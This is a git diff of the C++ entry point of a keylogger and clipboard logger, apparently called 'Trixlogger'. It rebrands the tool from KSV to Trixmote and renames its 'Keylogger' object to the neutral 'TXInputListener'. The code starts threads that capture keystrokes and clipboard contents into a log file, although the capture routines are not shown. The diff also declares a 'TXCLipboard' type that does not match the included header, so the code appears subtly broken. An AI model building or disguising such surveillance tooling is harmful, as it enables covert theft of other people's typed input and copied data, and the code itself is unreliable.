@@ -1,31 +1,31 @@
 #include <iostream>
 #include <fstream>
 #include <thread>
-#include "KSVArgumentation.h"
-#include "KSVLogger.h"
-#include "KSVInputListener.h"
-#include "KSVPresenter.h"
-#include "KSVClipboard.h"
+#include "TXArgumentation.h"
+#include "TXLogger.h"
+#include "TXInputListener.h"
+#include "TXPresenter.h"
+#include "TXClipboard.h"
 
 int main(int argc, const char *args[]) {
-    Argumentation *argumentation = new Argumentation(argc, args);
+    TXArgumentation *argumentation = new TXArgumentation(argc, args);
 
-    // Mostrar versão do KSV
+    // Mostrar versão do Trixmote
     if (argumentation->hasArg((char *) "--version") || argumentation->hasArg((char *) "-v")) {
-        Presenter::showVersion();
+        TXPresenter::showVersion();
         exit(0);
     }
 
-    // Mostrar menu de ajuda do KSV
+    // Mostrar menu de ajuda do Trixmote
     if (argumentation->hasArg((char *) "--help") || argumentation->hasArg((char *) "-h")) {
-        Presenter::showHelp();
+        TXPresenter::showHelp();
         exit(0);
     }
 
     // Welcome to... K S V!!
-    Presenter::showHeader();
+    TXPresenter::showHeader();
 
-    Logger *logger = Logger::instance();
+    TXLogger *logger = TXLogger::instance();
     bool useSameLogFile = true;
     char *file;
 
@@ -34,7 +34,7 @@ int main(int argc, const char *args[]) {
     if (inputFileLog != nullptr) {
         file = inputFileLog;
     } else {
-        logger->e("Log file output not found! Use --logFile parameter to specify a path to log file. Stopping KSV Trixlogger...");
+        logger->e("Log file output not found! Use --logFile parameter to specify a path to log file. Stopping Trixmote Trixlogger...");
         exit(1);
     }
 
@@ -57,7 +57,7 @@ int main(int argc, const char *args[]) {
             logger->clearLogFile();
 
             logger->write("[");
-            logger->write(Presenter::version());
+            logger->write(TXPresenter::version());
             logger->writeln("]");
         }
 
@@ -66,14 +66,14 @@ int main(int argc, const char *args[]) {
         logger->i("Log file does not exists... Creating on append mode!");
 
         logger->write("[");
-        logger->write(Presenter::version());
+        logger->write(TXPresenter::version());
         logger->writeln("]");
     }
 
     logger->line();
 
-    Keylogger keylogger;
-    Clipboard clipboard;
+    TXInputListener keylogger;
+    TXCLipboard clipboard;
 
     // Registra as threads dos Runners para captura de eventos
     std::thread thread[2];
@@ -99,7 +99,7 @@ int main(int argc, const char *args[]) {
     // Verifica se o keylogger deve ser ativado
     if (!disableKeyboard) {
 
-        // Inicia a execucão do Keylogger e faz o processo main esperar.
+        // Inicia a execucão do TXInputListener e faz o processo main esperar.
         thread[0].join();
     } else {
         logger->w("KEYLOGGER DISABLED");
